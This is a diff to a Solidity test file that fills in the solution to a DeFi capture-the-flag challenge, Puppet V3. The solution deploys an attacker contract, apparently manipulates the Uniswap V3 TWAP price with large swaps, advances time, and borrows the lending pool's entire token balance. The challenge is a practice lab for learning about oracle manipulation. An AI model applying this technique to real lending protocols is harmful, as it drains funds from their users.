@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,19 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // token0: token
+        // token1: weth
+
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(IUniswapV3Factory(positionManager.factory()).getPool(address(token), address(weth), FEE));
+        Attacker attacker = new Attacker(lendingPool, uniswapPool, token, weth, player);
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.attack(-999e17);
+        vm.warp(block.timestamp + 12);
+        attacker.attack(-1e17);
+        vm.warp(block.timestamp + 100);
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
